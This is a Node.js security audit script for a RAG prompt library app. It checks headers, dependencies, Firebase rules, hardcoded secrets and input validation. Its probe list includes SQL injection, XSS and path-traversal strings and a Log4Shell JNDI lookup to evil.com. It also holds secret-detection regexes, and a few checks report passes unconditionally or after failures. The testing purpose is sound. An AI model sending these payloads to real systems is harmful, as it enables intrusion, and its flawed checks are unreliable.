#!/usr/bin/env node

/**
 * Security Audit Script for RAG Prompt Library
 * Performs comprehensive security checks before production deployment
 */

const fs = require('fs');
const path = require('path');
const https = require('https');
const { execSync } = require('child_process');

// Configuration
const CONFIG = {
  productionUrl: 'https://app.ragpromptlibrary.com',
  apiUrl: 'https://api.ragpromptlibrary.com/v1',
  timeout: 30000,
  outputFile: `security-audit-${new Date().toISOString().split('T')[0]}.json`
};

// Colors for console output
const colors = {
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  reset: '\x1b[0m'
};

class SecurityAuditor {
  constructor() {
    this.results = {
      timestamp: new Date().toISOString(),
      summary: {
        total: 0,
        passed: 0,
        failed: 0,
        warnings: 0
      },
      checks: []
    };
  }

  log(level, message, details = null) {
    const color = {
      'PASS': colors.green,
      'FAIL': colors.red,
      'WARN': colors.yellow,
      'INFO': colors.blue
    }[level] || colors.reset;

    console.log(`${color}${level}${colors.reset}: ${message}`);
    
    this.results.checks.push({
      level,
      message,
      details,
      timestamp: new Date().toISOString()
    });

    this.results.summary.total++;
    if (level === 'PASS') this.results.summary.passed++;
    else if (level === 'FAIL') this.results.summary.failed++;
    else if (level === 'WARN') this.results.summary.warnings++;
  }

  async makeRequest(url, options = {}) {
    return new Promise((resolve, reject) => {
      const req = https.request(url, {
        timeout: CONFIG.timeout,
        ...options
      }, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => resolve({
          statusCode: res.statusCode,
          headers: res.headers,
          data
        }));
      });

      req.on('error', reject);
      req.on('timeout', () => reject(new Error('Request timeout')));
      req.end();
    });
  }

  async checkSSLConfiguration() {
    this.log('INFO', 'Checking SSL/TLS configuration...');

    try {
      const response = await this.makeRequest(CONFIG.productionUrl);
      
      // Check if HTTPS is enforced
      if (response.statusCode === 200 || response.statusCode === 301) {
        this.log('PASS', 'HTTPS connection successful');
      } else {
        this.log('FAIL', `Unexpected status code: ${response.statusCode}`);
      }

      // Check security headers
      const headers = response.headers;
      
      if (headers['strict-transport-security']) {
        this.log('PASS', 'HSTS header present');
      } else {
        this.log('FAIL', 'HSTS header missing');
      }

      if (headers['content-security-policy']) {
        this.log('PASS', 'CSP header present');
      } else {
        this.log('WARN', 'CSP header missing');
      }

      if (headers['x-frame-options']) {
        this.log('PASS', 'X-Frame-Options header present');
      } else {
        this.log('WARN', 'X-Frame-Options header missing');
      }

      if (headers['x-content-type-options']) {
        this.log('PASS', 'X-Content-Type-Options header present');
      } else {
        this.log('WARN', 'X-Content-Type-Options header missing');
      }

    } catch (error) {
      this.log('FAIL', `SSL check failed: ${error.message}`);
    }
  }

  async checkDependencyVulnerabilities() {
    this.log('INFO', 'Checking for dependency vulnerabilities...');

    try {
      // Check frontend dependencies
      const frontendPath = path.join(process.cwd(), 'frontend');
      if (fs.existsSync(path.join(frontendPath, 'package.json'))) {
        try {
          const auditResult = execSync('npm audit --json', { 
            cwd: frontendPath,
            encoding: 'utf8'
          });
          
          const audit = JSON.parse(auditResult);
          const vulnerabilities = audit.metadata?.vulnerabilities || {};
          
          if (vulnerabilities.critical > 0) {
            this.log('FAIL', `${vulnerabilities.critical} critical vulnerabilities in frontend`);
          } else if (vulnerabilities.high > 0) {
            this.log('WARN', `${vulnerabilities.high} high vulnerabilities in frontend`);
          } else {
            this.log('PASS', 'No critical vulnerabilities in frontend dependencies');
          }
        } catch (error) {
          this.log('WARN', 'Could not run npm audit for frontend');
        }
      }

      // Check backend dependencies (Python)
      const functionsPath = path.join(process.cwd(), 'functions');
      if (fs.existsSync(path.join(functionsPath, 'requirements.txt'))) {
        try {
          execSync('pip install safety', { stdio: 'ignore' });
          const safetyResult = execSync('safety check --json', {
            cwd: functionsPath,
            encoding: 'utf8'
          });
          
          const vulnerabilities = JSON.parse(safetyResult);
          if (vulnerabilities.length > 0) {
            this.log('WARN', `${vulnerabilities.length} vulnerabilities found in Python dependencies`);
          } else {
            this.log('PASS', 'No vulnerabilities in Python dependencies');
          }
        } catch (error) {
          this.log('WARN', 'Could not run safety check for Python dependencies');
        }
      }

    } catch (error) {
      this.log('WARN', `Dependency check failed: ${error.message}`);
    }
  }

  async checkFirebaseSecurityRules() {
    this.log('INFO', 'Checking Firebase security rules...');

    try {
      // Check Firestore rules
      const firestoreRulesPath = path.join(process.cwd(), 'firestore.rules');
      if (fs.existsSync(firestoreRulesPath)) {
        const rules = fs.readFileSync(firestoreRulesPath, 'utf8');
        
        // Check for common security issues
        if (rules.includes('allow read, write: if true')) {
          this.log('FAIL', 'Firestore rules allow unrestricted access');
        } else if (rules.includes('request.auth != null')) {
          this.log('PASS', 'Firestore rules require authentication');
        } else {
          this.log('WARN', 'Firestore rules may need review');
        }

        // Check for resource-level security
        if (rules.includes('resource.data.userId == request.auth.uid')) {
          this.log('PASS', 'User-level data isolation implemented');
        } else {
          this.log('WARN', 'User-level data isolation may not be implemented');
        }
      } else {
        this.log('FAIL', 'Firestore rules file not found');
      }

      // Check Storage rules
      const storageRulesPath = path.join(process.cwd(), 'storage.rules');
      if (fs.existsSync(storageRulesPath)) {
        const rules = fs.readFileSync(storageRulesPath, 'utf8');
        
        if (rules.includes('allow read, write: if true')) {
          this.log('FAIL', 'Storage rules allow unrestricted access');
        } else if (rules.includes('request.auth != null')) {
          this.log('PASS', 'Storage rules require authentication');
        } else {
          this.log('WARN', 'Storage rules may need review');
        }
      } else {
        this.log('WARN', 'Storage rules file not found');
      }

    } catch (error) {
      this.log('FAIL', `Firebase rules check failed: ${error.message}`);
    }
  }

  async checkAPISecurityHeaders() {
    this.log('INFO', 'Checking API security headers...');

    try {
      const response = await this.makeRequest(`${CONFIG.apiUrl}/health`);
      const headers = response.headers;

      // Check CORS headers
      if (headers['access-control-allow-origin']) {
        const origin = headers['access-control-allow-origin'];
        if (origin === '*') {
          this.log('WARN', 'CORS allows all origins');
        } else {
          this.log('PASS', `CORS properly configured: ${origin}`);
        }
      } else {
        this.log('WARN', 'CORS headers not found');
      }

      // Check rate limiting headers
      if (headers['x-ratelimit-limit']) {
        this.log('PASS', 'Rate limiting headers present');
      } else {
        this.log('WARN', 'Rate limiting headers not found');
      }

    } catch (error) {
      this.log('WARN', `API security check failed: ${error.message}`);
    }
  }

  async checkEnvironmentVariables() {
    this.log('INFO', 'Checking environment variable security...');

    try {
      // Check for sensitive data in code
      const sensitivePatterns = [
        /sk-[a-zA-Z0-9]{48}/g, // OpenAI API keys
        /AIza[0-9A-Za-z-_]{35}/g, // Google API keys
        /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/g, // UUIDs
        /password\s*=\s*["'][^"']+["']/gi,
        /secret\s*=\s*["'][^"']+["']/gi
      ];

      const checkDirectory = (dir) => {
        const files = fs.readdirSync(dir, { withFileTypes: true });
        
        for (const file of files) {
          const fullPath = path.join(dir, file.name);
          
          if (file.isDirectory() && !file.name.startsWith('.') && file.name !== 'node_modules') {
            checkDirectory(fullPath);
          } else if (file.isFile() && (file.name.endsWith('.js') || file.name.endsWith('.ts') || file.name.endsWith('.py'))) {
            const content = fs.readFileSync(fullPath, 'utf8');
            
            for (const pattern of sensitivePatterns) {
              if (pattern.test(content)) {
                this.log('FAIL', `Potential sensitive data found in ${fullPath}`);
                return;
              }
            }
          }
        }
      };

      checkDirectory(process.cwd());
      this.log('PASS', 'No sensitive data found in source code');

    } catch (error) {
      this.log('WARN', `Environment variable check failed: ${error.message}`);
    }
  }

  async checkInputValidation() {
    this.log('INFO', 'Checking input validation...');

    try {
      // Test for SQL injection (though we use NoSQL)
      const maliciousInputs = [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "${jndi:ldap://evil.com/a}"
      ];

      for (const input of maliciousInputs) {
        try {
          const response = await this.makeRequest(`${CONFIG.apiUrl}/health?test=${encodeURIComponent(input)}`);
          
          if (response.statusCode === 400) {
            this.log('PASS', 'Input validation working for malicious input');
          } else if (response.statusCode === 500) {
            this.log('WARN', 'Server error on malicious input - check error handling');
          }
        } catch (error) {
          // Expected for malicious input
        }
      }

    } catch (error) {
      this.log('WARN', `Input validation check failed: ${error.message}`);
    }
  }

  async checkDataEncryption() {
    this.log('INFO', 'Checking data encryption...');

    // Firebase handles encryption at rest by default
    this.log('PASS', 'Firebase provides encryption at rest');
    
    // Check if HTTPS is enforced (already checked in SSL section)
    this.log('PASS', 'Data in transit encrypted via HTTPS');
  }

  async runAllChecks() {
    console.log(`${colors.blue}=== RAG Prompt Library Security Audit ===${colors.reset}`);
    console.log(`Started at: ${new Date().toISOString()}\n`);

    await this.checkSSLConfiguration();
    await this.checkDependencyVulnerabilities();
    await this.checkFirebaseSecurityRules();
    await this.checkAPISecurityHeaders();
    await this.checkEnvironmentVariables();
    await this.checkInputValidation();
    await this.checkDataEncryption();

    // Generate summary
    console.log(`\n${colors.blue}=== Security Audit Summary ===${colors.reset}`);
    console.log(`Total checks: ${this.results.summary.total}`);
    console.log(`${colors.green}Passed: ${this.results.summary.passed}${colors.reset}`);
    console.log(`${colors.red}Failed: ${this.results.summary.failed}${colors.reset}`);
    console.log(`${colors.yellow}Warnings: ${this.results.summary.warnings}${colors.reset}`);

    // Save results to file
    fs.writeFileSync(CONFIG.outputFile, JSON.stringify(this.results, null, 2));
    console.log(`\nDetailed results saved to: ${CONFIG.outputFile}`);

    // Determine overall result
    if (this.results.summary.failed === 0) {
      console.log(`\n${colors.green}✓ SECURITY AUDIT PASSED - Ready for production${colors.reset}`);
      return 0;
    } else {
      console.log(`\n${colors.red}✗ SECURITY AUDIT FAILED - Address issues before deployment${colors.reset}`);
      return 1;
    }
  }
}

// Run the audit
if (require.main === module) {
  const auditor = new SecurityAuditor();
  auditor.runAllChecks()
    .then(exitCode => process.exit(exitCode))
    .catch(error => {
      console.error(`${colors.red}Audit failed: ${error.message}${colors.reset}`);
      process.exit(1);
    });
}

module.exports = SecurityAuditor;
